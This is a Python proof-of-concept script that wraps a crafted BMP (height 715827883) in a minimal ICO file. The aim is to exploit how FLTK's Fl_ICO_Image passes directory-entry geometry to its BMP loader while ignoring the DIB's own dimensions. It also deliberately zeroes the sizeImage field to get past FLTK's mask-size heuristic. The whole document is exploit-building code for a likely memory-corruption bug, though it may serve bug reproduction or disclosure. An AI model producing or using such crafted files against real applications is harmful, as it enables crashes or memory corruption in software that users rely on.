#!/usr/bin/env python3
"""Wrap an existing 118-byte BMP's DIB (bytes 14..118) in a minimal ICO.

FLTK's Fl_ICO_Image reads geometry from the 16-byte IconDirEntry (bWidth,
bHeight are bytes) and passes those as ico_width/ico_height into
Fl_BMP_Image::load_bmp_(), which then ignores the DIB's own width/height.
The crafted DIB still carries width=2, height=715827883, depth=24.
"""
import struct
import sys


def wrap(src: str, dst: str, dir_w: int = 2, dir_h: int = 0, full: bool = False) -> None:
    bmp = open(src, "rb").read()
    assert bmp[:2] == b"BM" and len(bmp) == 118, (src, len(bmp))
    dib = bmp[14:]
    assert len(dib) == 104
    if full:
        # A complete 2 x 256 x 24bpp ICO resource (8 bytes/row with DWORD
        # padding). Zero the DIB sizeImage field so FLTK's mask heuristic
        # (maskSize == 2*dataSize) does not halve the height.
        header = bytearray(dib[:40])
        header[20:24] = b"\x00\x00\x00\x00"
        dib = bytes(header) + (bmp[54:62] * 256)
        assert len(dib) == 40 + 2048
    ico = struct.pack("<HHH", 0, 1, 1)          # ICONDIR: reserved, type=1, count=1
    ico += struct.pack(
        "<BBBBHHII",
        dir_w & 0xFF, dir_h & 0xFF,              # bWidth, bHeight (0 means 256)
        0, 0,                                    # colors, reserved
        1, 24,                                   # planes, bit count
        len(dib), 6 + 16,                        # bytes in resource, offset
    )
    assert len(ico) == 22
    ico += dib
    open(dst, "wb").write(ico)
    print("%s bytes=%d from=%s dib_bytes=%d dir_w=%d dir_h_enc=%d full=%s" %
          (dst, len(ico), src, len(dib), dir_w, dir_h, full))


if __name__ == "__main__":
    if len(sys.argv) not in (3, 4):
        sys.exit("usage: gen_ico.py crafted.bmp out.ico [full]")
    wrap(sys.argv[1], sys.argv[2], full=(len(sys.argv) == 4 and sys.argv[3] == "full"))
